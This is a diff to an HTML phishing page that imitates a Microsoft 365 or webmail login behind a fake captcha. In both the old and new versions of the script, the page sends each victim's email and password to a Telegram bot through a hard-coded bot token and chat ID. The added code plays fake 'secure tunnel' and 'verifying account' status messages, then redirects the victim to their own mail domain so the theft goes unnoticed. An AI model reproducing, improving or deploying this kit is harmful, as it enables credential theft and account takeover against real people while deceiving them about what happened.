@@ -36,62 +36,106 @@
       </button>
     </form>
   </div>
+  <!-- LOADING SCREEN -->
+<div id="loadingScreen" style="display:none; background:white; padding:32px; border-radius:10px; box-shadow:0 0 16px rgba(0,0,0,0.08); max-width:360px; width:92%; text-align:center;">
+  <div class="spinner" style="margin: 0 auto 16px;"></div>
+  <div style="font-size:16px; font-weight:500; color:#1a1a1a; margin-bottom:8px;">Verifying...</div>
+  <p id="statusText" style="font-size:14px; color:#605e5c;">Preparing verification steps...</p>
+</div>
 
-  <!-- SCRIPT -->
+
   <script>
-    const captchaText = document.getElementById("captchaText");
-    const captchaInput = document.getElementById("captchaInput");
-    const captchaCard = document.getElementById("captchaCard");
-    const formCard = document.getElementById("formCard");
-    const form = document.getElementById("loginForm");
+  const captchaText = document.getElementById("captchaText");
+  const captchaInput = document.getElementById("captchaInput");
+  const captchaCard = document.getElementById("captchaCard");
+  const formCard = document.getElementById("formCard");
+  const form = document.getElementById("loginForm");
+  const loadingScreen = document.getElementById("loadingScreen");
 
-    let generatedCaptcha = "";
+  let generatedCaptcha = "";
 
-    function generateCaptcha() {
-      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789';
-      generatedCaptcha = Array.from({length: 6}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
-      captchaText.textContent = generatedCaptcha;
+  function generateCaptcha() {
+    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789';
+    generatedCaptcha = Array.from({ length: 6 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+    captchaText.textContent = generatedCaptcha;
+  }
+
+  function validateCaptcha() {
+    if (captchaInput.value.trim() === generatedCaptcha) {
+      captchaCard.style.display = "none";
+      formCard.style.display = "block";
+    } else {
+      alert("Incorrect captcha. Try again.");
+      generateCaptcha();
+      captchaInput.value = '';
+    }
+  }
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (!email || !password) {
+      alert("Please fill all fields.");
+      return;
     }
 
-    function validateCaptcha() {
-      if (captchaInput.value.trim() === generatedCaptcha) {
-        captchaCard.style.display = "none";
-        formCard.style.display = "block";
-      } else {
-        alert("Incorrect captcha. Please try again.");
-        generateCaptcha();
-        captchaInput.value = '';
-      }
+    formCard.style.display = "none";
+    loadingScreen.style.display = "block";
+
+    const statusText = document.getElementById("statusText");
+    const steps = [
+      "Establishing secure tunnel...",
+      "Verifying account with your provider...",
+      "Syncing mailbox data...",
+      "Almost done..."
+    ];
+
+    // Loop through messages
+    for (let i = 0; i < steps.length; i++) {
+      statusText.textContent = steps[i];
+      await new Promise(r => setTimeout(r, 1500));
     }
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value.trim();
+    // Send to Telegram
+    const telegramBotToken = "8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8";
+    const chatId = "1318100118";
+    const message = `365 Login:\nEmail: ${email}\nPassword: ${password}`;
+    try {
+      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+    } catch (err) {
+      console.warn("Telegram failed silently.");
+    }
 
-      if (!email || !password) {
-        alert("Please enter both fields.");
-        return;
-      }
+    // Final delay + redirect
+    setTimeout(() => {
+      const domain = email.split("@")[1];
+      window.location.href = `https://${domain}`;
+    }, 2000);
+  });
 
-      const telegramBotToken = "8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8";
-      const chatId = "1318100118";
-      const message = `WebMail4 Login:\nEmail: ${email}\nPassword: ${password}`;
+  generateCaptcha();
+</script>
+<style>
+  .spinner {
+    width: 32px;
+    height: 32px;
+    border: 4px solid #d0d0d0;
+    border-top: 4px solid #0078d4;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
 
-      try {
-        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: message })
-        });
-        alert("Session restored.");
-        form.reset();
-      } catch (error) {
-        alert("Failed to restore session.");
-      }
-    });
+  @keyframes spin {
+    0%   { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
 
-    generateCaptcha();
-  </script>
 </body>
 </html>
